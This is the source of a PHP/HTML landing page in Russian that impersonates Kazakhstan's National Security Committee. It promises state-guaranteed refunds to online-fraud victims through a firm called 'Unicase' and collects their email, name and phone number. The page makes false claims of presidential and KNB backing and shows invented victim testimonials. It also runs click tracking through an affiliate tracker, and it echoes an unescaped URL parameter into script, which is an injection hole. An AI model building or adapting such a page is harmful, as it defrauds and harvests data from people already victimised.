<?php
if (isset($_GET['kreo'])) {
   $kreo = $_GET['kreo'];
   setcookie('kreo', $_GET['kreo'], time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['kreo'])) {
   $kreo = $_COOKIE['kreo'];
}

if (isset($_GET['subid'])) {
   $subid = $_GET['subid'];
   setcookie('subid', $_GET['subid'], time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['subid'])) {
   $subid = $_COOKIE['subid'];
}

if (isset($_GET['px'])) {
   $pxCookie = $_GET['px'];
   setcookie('pxCookie', $pxCookie, time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['pxCookie'])) {
   $pxCookie = $_COOKIE['pxCookie'];
}

if (isset($_GET['source'])) {
   $source = $_GET['source'];
   setcookie('source', $source, time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['source'])) {
   $source = $_COOKIE['source'];
}

if (isset($_GET['geo'])) {
   $geo = $_GET['geo'];
   setcookie('geo', $geo, time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['geo'])) {
   $geo = $_COOKIE['geo'];
}

if (isset($_GET['buyer'])) {
   $buyer = $_GET['buyer'];
   setcookie('buyer', $buyer, time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['buyer'])) {
   $buyer = $_COOKIE['buyer'];
}else {
   $buyer = 'Bunny';
   setcookie('buyer', $buyer, time() + 3600 * 24 * 30, '/');
}

if (isset($_GET['fbclid'])) {
   $fbclid = $_GET['fbclid'];
   setcookie('fbclid', $fbclid, time() + 3600 * 24 * 30, '/');
} elseif (isset($_COOKIE['fbclid'])) {
   $fbclid = $_COOKIE['fbclid'];
}



function writeLog($message) {
   // Define the file path for the log
   $logFile = 'log.txt';
   
   // Get the current timestamp
   $timestamp = date("Y-m-d H:i:s");
   
   // Format the log message
   $logMessage = "[" . $timestamp . "] " . $message . PHP_EOL;
   
   // Write the log message to the file
   file_put_contents($logFile, $logMessage, FILE_APPEND | LOCK_EX);
}

writeLog('NEW USER CLIKC. PIXEL: ' . $pxCookie . ' CLICK ID: ' . $fbclid);


?>

<!DOCTYPE html>
<html lang="ru">

<head>

   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, user-scalable=no">
   <meta name="robots" content="noindex" />
   <title>Международная юридическая фирма Unicase</title>
   <link rel="icon" type="image/x-icon" href="favicon.png">
   <link rel="stylesheet" href="libs/intlTelInput.css">
   <link rel="stylesheet" href="css/grata-style.min.css?v=0.0.2">
   <link rel="stylesheet" href="css/custom.css">

   <!-- Meta Pixel Code -->
   <script>
   !function(f,b,e,v,n,t,s)
   {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
   n.callMethod.apply(n,arguments):n.queue.push(arguments)};
   if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
   n.queue=[];t=b.createElement(e);t.async=!0;
   t.src=v;s=b.getElementsByTagName(e)[0];
   s.parentNode.insertBefore(t,s)}(window, document,'script',
   'https://connect.facebook.net/en_US/fbevents.js');
   fbq('init', '<?php echo $pxCookie; ?>');
   fbq('track', 'PageView');
   </script>
   <noscript><img height="1" width="1" style="display:none"
   src="https://www.facebook.com/tr?id=<?php echo $pxCookie; ?>&ev=PageView&noscript=1"
   /></noscript>
   <!-- End Meta Pixel Code -->

   <!-- Microsoft Clarity -->
   <script type="text/javascript">
       (function(c,l,a,r,i,t,y){
           c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
           t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
           y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
       })(window, document, "clarity", "script", "r99x70yoh9");
   </script>

   <!-- Keitaro tracking script -->
   <script type='application/javascript'>
   if (!window.KTracking){window.KTracking={collectNonUniqueClicks: false, multiDomain: false, R_PATH: 'https://uzunicase.click/gQRYjQzX', P_PATH:'https://uzunicase.click/gQRYjQzX/postback', listeners: [], reportConversion: function(){this.queued = arguments;}, getSubId: function(fn) {this.listeners.push(fn);}, ready: function(fn) {this.listeners.push(fn);} };}(function(){var a=document.createElement('script');a.type='application/javascript';a.async=true;a.src='https://uzunicase.click/js/k.min.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(a,s)})();
   </script><noscript><img height='0' width='0' alt='' src='https://uzunicase.click/gQRYjQzX'/></noscript>

</head>

<body>

   <div class="grata-body-inner">

      <header class="grata-header" id="grata-header">
         <div class="grata-container">
            <div class="header-wrapper">
               <a href="/" class="header-logotype">
                  <img src="images/logotype.png" alt="Logotype">
               </a>
               <div class="header-right">
                  <nav class="header-menu">
                     <ul>
                        <li><a href="https://www.gov.kz/memleket/entities/knb/about">О комитете</a></li>
                        <li><a href="https://www.gov.kz/memleket/entities/knb/activities/directions">Деятельность</a>
                        </li>
                        <li><a href="https://www.gov.kz/memleket/entities/knb/documents/1">Документы</a></li>
                        <li><a href="https://www.gov.kz/memleket/entities/knb/press">Пресс-центр</a></li>
                        <li><a href="#grata-consult">Онлайн-приемная</a></li>
                     </ul>
                  </nav>
                  <button type="button" class="grata-button grata-button-menu js-button-menu" aria-label="Open menu">
                     <span></span>
                     <span></span>
                     <span></span>
                  </button>
               </div>
            </div>
         </div>

         <div class="mobile-menu js-mobile-menu">
            <div class="grata-container">
               <nav class="header-menu">
                  <ul>
                     <li><a href="https://www.gov.kz/memleket/entities/knb/about">О комитете</a></li>
                     <li><a href="https://www.gov.kz/memleket/entities/knb/activities/directions">Деятельность</a>
                     </li>
                     <li><a href="https://www.gov.kz/memleket/entities/knb/documents/1">Документы</a></li>
                     <li><a href="https://www.gov.kz/memleket/entities/knb/press">Пресс-центр</a></li>
                     <li><a href="#grata-consult">Онлайн-приемная</a></li>
                  </ul>
               </nav>
            </div>
         </div>
      </header>

      <main id="grata-page-content" class="grata-page-content">
         <section class="grata-banner" id="grata-banner">
            <div class="grata-container">
               <div class="data-content">
                  <h1 class="data-title">
                     Комитет национальной безопасности
                  </h1>
                  <div class="data-description">
                     <p>
                        <strong>Глава государства поставил задачу</strong> - привлечь к ответственности мошенников и
                        возвращать деньги
                        пострадавшим
                     </p>
                     <p><strong>Комитет национальной безопасности уже возвращает деньги пострадавшим и наказывает
                           брокеров.</strong></p>
                  </div>
               </div>
            </div>
         </section>

         <section class="grata-consult" id="grata-consult">
            <div class="grata-container">
               <div class="data-wrapper">
                  <div class="data-image-wrapper">
                     <div class="data-image">
                        <img src="images/president.jpg" alt="Президент">
                     </div>
                     <div class="data-image-description">
                        <p>
                           Официальное заявление: Правительство издало указ о борьбе с инвестиционным мошенничеством.
                        </p>
                        <p>
                           Деньги будут возвращены всем пострадавшим, преступники будут наказаны!
                        </p>
                     </div>
                  </div>
                  <div class="data-content">
                     <h2 class="data-title">
                        Если вы пострадали от мошенников в интернете -
                        <span>оставляйте заявку</span>
                     </h2>
                     <div class="data-subtitle">
                        Государственная помощь гарантирована
                     </div>
                     <div class="data-form-wrapper">
                        <form action="submit.php" method="POST" class="grata-form">
                           <div class="data-block">
                              <input type="email" name="user_email" class="data-input" id="user-email"
                                 placeholder="Ваш Email">
                              <div class="grata-error-message"></div>
                           </div>
                           <div class="data-block">
                              <input type="text" name="user_name" class="data-input" id="user-name"
                                 placeholder="Ваше имя">
                              <div class="grata-error-message"></div>
                           </div>
                           <div class="data-block">
                              <input type="text" name="user_phone" class="data-input" id="user-phone">
                              <div class="grata-error-message" id="grata-phone-error"></div>
                           </div>
                           <div class="grata-button-wrapper">
                              <button type="submit" class="grata-button grata-button-blue">Вернуть вложения</button>
                           </div>
                           <div class="grata-form-message"></div>
                        </form>
                        <div class="data-form-description">
                           <p>
                              С Вами свяжется специалист компании <strong>"Unicase"</strong> <br>
                              <strong>Данная компания работает под руководством КНБ.</strong> <br>
                              <u>Все другие компании могут быть мошенниками - будьте внимательны</u>
                           </p>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </section>

         <section class="grata-request" id="request" style="background-image: url('images/section-bg.jpg');">
            <div class="grata-container">
               <div class="data-content">
                  <h2 class="data-title">
                     Если вы пострадали от интернет-мошенников, оставляйте заявку
                  </h2>
                  <div class="data-description">
                     Компания представитель - "Unicase" работает совмесно с Комитетом национальной
                     безопасности РК.
                  </div>
               </div>
            </div>
         </section>

         <section class="grata-reviews" id="grata-reviews">
            <div class="grata-container">
               <h2 class="data-title">
                  Многим мошенникам уже вынесен судебный приговор.
                  Компенсацию уже получили и вернули свои средства:
               </h2>
               <div class="data-list">
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/alisher-ismailov.png" alt="Алишер Исмаилов">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Алишер Исмаилов</h3>
                        <div class="data-item-description">
                           <p>
                              Криминалисты очень быстро вычислили конечного получателя похищенных у меня средств.
                              Полная сумма и компенсация была возмещена в досудебном порядке. Работой службы возврата
                              остался доволен!
                           </p>
                        </div>
                     </div>
                  </div>
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/madina-zhaksylykova.png" alt="Мадина Жаксылыкова">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Мадина Жаксылыкова</h3>
                        <div class="data-item-description">
                           <p>
                              Когда я получила на свою карту заветный платеж, которое покрыло сумму украденных
                              средств - я сначала не поверила своим глазам. Никогда в жизни я не испытывала такого
                              облегчения!
                           </p>
                        </div>
                     </div>
                  </div>
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/saule-sejdullaeva.png" alt="Сауле Сейдуллаева">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Сауле Сейдуллаева</h3>
                        <div class="data-item-description">
                           <p>
                              Служба кибербезопасности — истинные спасатели! Мне повезло, что они помогли вернуть мои
                              деньги после мошенничества на бирже. Очень благодарна за их труд
                           </p>
                        </div>
                     </div>
                  </div>
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/arsalan.png" alt="Арслан Султанбеков">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Арслан Султанбеков</h3>
                        <div class="data-item-description">
                           <p>
                              После того как мошенники похитили мои деньги, я был уверен, что вернуть их будет невозможно. Но благодаря команде специалистов, все средства были восстановлены. Слаженная работа и скорость решения вопроса впечатлили! Теперь я точно знаю, куда обращаться в подобных ситуациях.
                           </p>
                        </div>
                     </div>
                  </div>
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/temirlan-askarov.png" alt="Темирлан Аскаров">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Темирлан Аскаров</h3>
                        <div class="data-item-description">
                           <p>
                              Большое спасибо Unicase за помощь в возврате моих денег от брокера! Я думал что
                              потерял деньги навсегда, но они оказались настоящими профессионалами и помогли мне
                              вернуть полную сумму!
                           </p>
                        </div>
                     </div>
                  </div>
                  <div class="data-item">
                     <div class="data-item-image">
                        <img src="images/aigul2.png" alt="Айгуль Байтасова">
                     </div>
                     <div class="data-item-info">
                        <h3 class="data-item-title">Айгуль Байтасова</h3>
                        <div class="data-item-description">
                           <p>
                              Когда я поняла, что стала жертвой мошенничества, то была в полном отчаянии. Но благодаря оперативной работе специалистов службы возврата, мои средства вернулись на счет. Получить всю сумму обратно — это было как чудо! Огромная благодарность за профессионализм и поддержку!
                           </p>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </section>
      </main>

      <footer class="grata-footer" id="grata-footer">
         <div class="grata-container">
            <div class="footer-wrapper">
               <div class="footer-text">
                  Комитет национальной
                  безопасности Республики Казахстан
               </div>
               <ul class="footer-menu">
                  <li>
                     <a href="http://www.akorda.kz/ru" target="_blank">Сайт Президента РК</a>
                  </li>
                  <li>
                     <a href="https://primeminister.kz/ru" target="_blank">Сайт Премьер-Министра РК</a>
                  </li>
                  <li>
                     <a href="http://www.parlam.kz/ru" target="_blank">Сайт Парламента РК</a>
                  </li>
                  <li>
                     <a href="https://www.gov.kz/article/128915?lang=ru" target="_blank">Государственные символы РК</a>
                  </li>
                  <li>
                     <a href="http://www.akorda.kz/ru/addresses" target="_blank">Послания Президента РК</a>
                  </li>
                  <li>
                     <a href="https://www.gov.kz/memleket/entities/mam/documents/details/474854"
                        target="_blank">Национальный стандарт Республики Казахстан</a>
                  </li>
               </ul>
               <div class="footer-button">
                  <a href="#grata-header">
                     <span>Наверх</span>
                     <svg role="presentation" width="5" height="17" viewBox="0 0 6 20">
                        <path fill="#ffffff"
                           d="M5.78 3.85L3.12.28c-.14-.14-.3-.14-.43 0L.03 3.85c-.14.13-.08.27.13.27h1.72V20h2.06V4.12h1.72c.15 0 .22-.07.19-.17a.26.26 0 00-.07-.1z"
                           fill-rule="evenodd"></path>
                     </svg>
                  </a>
               </div>
            </div>
         </div>
      </footer>
   </div>

   <script src="libs/intlTelInput.min.js"></script>
   <script src="js/grata-form-script.js?v=0.0.2"></script>
   <script src="js/grata-script.js?v=0.0.2"></script>

</body>

</html>